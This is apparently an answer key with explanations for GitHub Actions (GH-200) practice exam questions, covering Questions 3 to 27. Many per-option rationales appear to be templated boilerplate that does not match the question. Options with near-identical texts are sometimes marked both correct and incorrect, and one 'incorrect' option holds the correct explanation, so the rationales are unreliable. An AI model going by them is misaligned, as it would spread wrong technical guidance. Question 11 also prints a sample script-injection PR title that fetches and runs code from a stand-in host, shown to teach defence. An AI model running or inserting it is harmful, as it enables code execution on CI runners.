- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **E:** Correct. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **F:** Correct. `workflow_dispatch` validates manual UI/API triggers (`up to 10 typed inputs`), while `workflow_call` exposes typed reusable workflow interfaces.

### Question 3 — `D` (Author and manage workflows)

Correct answer: D (is correct). Because `tags` and `tags-ignore` cannot be used together on the same event, use negative `!` filter patterns inside a single `tags:` list: `tags: ['v*', '!*-alpha*', '!*-rc*']` (`positive pattern first, negative ! exclusion after`). [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.

### Question 4 — `A, C` (Author and manage workflows)

Correct answers: A and C (are correct). Feature-branch / PR runs cancel superseded runs immediately (`cancel-in-progress: true`), whereas `main` branch runs evaluate `cancel-in-progress: false` so commits on `main` never abort an active `main` run (`and unspecified GITHUB_TOKEN permissions default to none`). [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **E:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **F:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 5 — `B` (Author and manage workflows)

Correct answer: B (is correct). Inside a `workflow_call` reusable workflow (`as well as modern workflow_dispatch`), declared inputs are accessed directly via `${{ inputs.java-version }}`. [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. `workflow_dispatch` provides rich UI-validated input types (`up to 10 inputs`), while `workflow_call` validates reusable-workflow `inputs` and `secrets`.
- **C:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 6 — `B` (Author and manage workflows)

Correct answer: B (is correct). Declaring `on: workflow_call` (`inputs`, `secrets`, `outputs`), writing `$GITHUB_OUTPUT` + job `outputs`, invoking `jobs.<id>.uses` (`@<sha>`) with `with:` & `secrets:`, and reading `needs.<id>.outputs.<key>` wires reusable workflows cleanly. [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Incorrect. A reusable workflow fails without `on: workflow_call`, `$GITHUB_ENV` never crosses jobs, and passing secrets in `with:` leaks plaintext.
- **B:** Correct. Reusable workflows map step `$GITHUB_OUTPUT` -> job `outputs` -> `on.workflow_call.outputs`, which caller jobs read via `needs.<id>.outputs`.
- **C:** Incorrect. Reusable workflows must live in `.github/workflows/`, be invoked at `jobs.<id>.uses` (not `steps:`), and map secrets/outputs explicitly.
- **D:** Incorrect. `workflow_dispatch` cannot be called by `uses:`, `::set-output` is retired, and downstream jobs must `needs:` the reusable workflow job.

### Question 7 — `C` (Author and manage workflows)

Correct answer: C (is correct). `if: cancelled()` evaluates `true` strictly when the workflow run was canceled (`unlike always(), which runs on success, failure, AND cancellation`). [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 8 — `D` (Author and manage workflows)

Correct answer: D (is correct). Yes — `continue-on-error: true` turns `steps.jmh-bench.conclusion` into `'success'` so the job stays green, while `steps.jmh-bench.outcome` preserves `'failure'` so the follow-up step detects the raw benchmark failure accurately. [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **D:** Correct. Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.

### Question 9 — `A` (Author and manage workflows)

Correct answer: A (is correct). `needs.<job_id>.result` exposes the final completion state (`'success'`, `'failure'`, `'cancelled'`, or `'skipped'`) of each direct upstream dependency listed in `needs:`. [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Correct. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 10 — `B` (Author and manage workflows)

Correct answer: B (is correct). The `needs` context inside a job exposes outputs ONLY from jobs listed DIRECTLY in that job's own `needs:` array; `job_c` must declare `needs: [job_a, job_b]` (`or job_b must re-export the output`) to read `needs.job_a.outputs.version`. [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.
- **C:** Incorrect. The official GitHub Actions VS Code extension validates workflow syntax, autocompletes action `with:` inputs and `vars`/`secrets`, and inspects runs in-editor.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 11 — `A` (Author and manage workflows)

Correct answer: A (is correct). Emitting `::warning file=<path>,line=<n>,endLine=<m>,title=<t>::<message>` (`or ::error / ::notice`) attaches inline code annotations directly onto matching lines in the pull request diff and Checks tab (`up to 10 warning and 10 error annotations shown per step`). [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 12 — `A, B, C` (Author and manage workflows)

Correct answers: A, B, and C (are correct). `$GITHUB_ENV` sets environment variables for subsequent steps in the SAME job; `$GITHUB_OUTPUT` exports `key=value` step outputs (`which bubble across jobs only when mapped via jobs.<id>.outputs and needs.<id>.outputs`); and `$GITHUB_PATH` prepends directories to `PATH` for subsequent steps in the SAME job. [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **B:** Correct. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.
- **C:** Correct. `$GITHUB_OUTPUT` paired with `jobs.<id>.outputs` is the supported mechanism for passing string metadata between separate jobs.
- **D:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **E:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **F:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 13 — `C` (Author and manage workflows)

Correct answer: C (is correct). When `ports: ['9092']` maps container port `9092` to a random ephemeral host port, `${{ job.services.<service_label>.ports['9092'] }}` resolves the assigned host port number at runtime. [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Correct. Service containers spin up sidecar databases/queues with Docker health probes; host steps use mapped `localhost` ports whereas job containers use service labels.
- **D:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.

### Question 14 — `C` (Author and manage workflows)

Correct answer: C (is correct). Defining `services.postgres` with `--health-cmd pg_isready`, mapping `ports` (host) or setting job `container:`, waiting for `healthy` status, and dialing `localhost:5432` or `postgres:5432` eliminates race conditions. [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Incorrect. Service containers require Linux Docker runner hosts and are destroyed automatically when the single job finishes.
- **B:** Incorrect. Host-runner steps cannot resolve Docker bridge hostname `postgres` (`use mapped ports + localhost`), and skipping `--health-cmd` causes races.
- **C:** Correct. Service containers run `--health-cmd` probes and connect via `localhost:<port>` on host runners or `<label>:5432` inside job containers.
- **D:** Incorrect. `services:` is a job-level key (never inside `steps:`), and steps inside a job `container:` dial `postgres:5432` over the Docker bridge.

### Question 15 — `D` (Author and manage workflows)

Correct answer: D (is correct). `${{ strategy.job-total }}` returns the total number of matrix jobs generated by the current `strategy.matrix` (`while ${{ strategy.job-index }} returns the 0-based index 0..9 of the current leg`). [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.

### Question 16 — `C, D` (Author and manage workflows)

Correct answers: C and D (are correct). An `include:` object whose existing axis keys (`os: ubuntu-24.04, jdk: '21'`) match a generated combination ADDS `jvm_flags` onto that existing leg without creating a duplicate job, whereas `{ os: ubuntu-24.04, jdk: '23-ea' }` has a non-matching `jdk` value so it APPENDS a 5th matrix job. [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.
- **D:** Correct. `fail-fast: false` lets all matrix variants finish reporting test results, and explicit image labels prevent unexpected `*-latest` migration breakages.
- **E:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **F:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.

### Question 17 — `D` (Author and manage workflows)

Correct answer: D (is correct). YAML anchors (`&`) and aliases (`*`) are purely lexical single-document features evaluated per `.yml` file (`never across separate workflow files`); sharing configuration across files requires `workflow_call` Reusable Workflows, Composite Actions, or Organization `vars.*`. [Skill 1.9: Simplify workflow definitions using YAML anchors and aliases within a workflow file | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. GitHub Actions natively parses YAML 1.1/1.2 node anchors (`&`), aliases (`*`), and map merges (`<<:`) within the same workflow file.

### Question 18 — `C` (Author and manage workflows)

Correct answer: C (is correct). Comparing `github.event.pull_request.head.repo.full_name != github.repository` (`or github.event.pull_request.head.repo.fork == true`) reliably distinguishes external fork pull requests from same-repository branch PRs. [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 19 — `C` (Author and manage workflows)

Correct answer: C (is correct). By default, `actions/checkout` sets `fetch-depth: 1` (`fetching only the single triggered commit for speed`); setting `fetch-depth: 0` fetches full Git history and tags for changelog/diff tools. [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.
- **D:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!

### Question 20 — `B` (Author and manage workflows)

Correct answer: B (is correct). GitHub Actions expressions perform loose type coercion on `==` (`coercing boolean true to 'true'`, `null` to `''`/`0`), and built-in `endsWith(searchString, '.sql')` checks string suffixes case-insensitively. [Skill 1.11: Write expressions using built-in functions and conditional operators | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. Built-in expression functions enable dynamic JSON matrices (`fromJSON`) and lockfile cache keys (`hashFiles`) without shell-parsing overhead.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 21 — `B` (Author and manage workflows)

Correct answer: B (is correct). The GitHub Actions VS Code extension fetches `action.yml` metadata for referenced actions and highlights missing `required: true` inputs, unknown `with:` input names, and invalid expression contexts directly in the editor Problems pane before commit. [Skill 1.12: Author and validate workflows using IDE extensions and developer tooling | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/quickstart)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Correct. The official GitHub Actions VS Code extension validates workflow syntax, autocompletes action `with:` inputs and `vars`/`secrets`, and inspects runs in-editor.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 22 — `B` (Author and manage workflows)

Correct answer: B (is correct). Yes — when `key` misses (`cache-hit != 'true'`), `actions/cache@v4` restores the newest matching `restore-keys` prefix entry (`setting cache-hit == 'false'`) and then uploads a new immutable cache entry under the exact `key` during its `post:` step if the job succeeds. [Skill 1.13: Configure dependency caching and manage workflow artifacts and retention | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Correct. Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.
- **C:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 23 — `C` (Author and manage workflows)

Correct answer: C (is correct). No — `$GITHUB_ENV` applies strictly to later steps in the SAME job on the same runner; cross-job values must be written to `$GITHUB_OUTPUT`, mapped under `jobs.build-image.outputs`, and read via `${{ needs.build-image.outputs.image_tag }}`. [Skill 1.14: Pass data between steps and jobs using outputs, environment variables, and artifacts | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/passing-information-between-jobs)]

- **A:** Incorrect. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.
- **B:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `$GITHUB_ENV` applies strictly to later steps in the SAME job on the same runner; cross-job values must be written to `$GITHUB_OUTPUT`, mapped under `jobs.build-image.outputs`, and read via `${{ needs.build-image.outputs.image_tag }}`.
- **C:** Correct. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **D:** Incorrect. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.

### Question 24 — `A` (Author and manage workflows)

Correct answer: A (is correct). Appending `?branch=main&event=push` to a workflow's `badge.svg` URL scopes the rendered status SVG strictly to `push` runs on `main` so ad-hoc `workflow_dispatch` or PR failures do not turn the `README` badge red. [Skill 1.15: Publish job summaries and configure workflow status badges | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions#adding-a-job-summary)]

- **A:** Correct. Appending Markdown to `$GITHUB_STEP_SUMMARY` renders rich test/coverage reports on the workflow run summary page.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 25 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). A new `on: pull_request` workflow runs immediately from the PR merge commit (`even before existing on main`), whereas `on: pull_request_target` reads workflow definitions EXCLUSIVELY from the base branch (`main`) so a newly added `pull_request_target` file will NOT run until merged to `main`. [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **B:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.

### Question 26 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). GitHub emits a separate `issues.labeled` webhook delivery for each applied label (`3` events), spawning `3` workflow runs unless deduplicated/serialized via `concurrency:`. [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **D:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).

### Question 27 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). In PowerShell steps, `$LASTEXITCODE` holds the numeric exit code of the last native Windows executable (`and GitHub's default pwsh wrapper sets $ErrorActionPreference = 'stop' and checks if ($LASTEXITCODE) { exit $LASTEXITCODE } at script end, so checking if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE } mid-script prevents later commands from masking it`). [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.

### Question 28 — `B` (Consume and troubleshoot workflows)

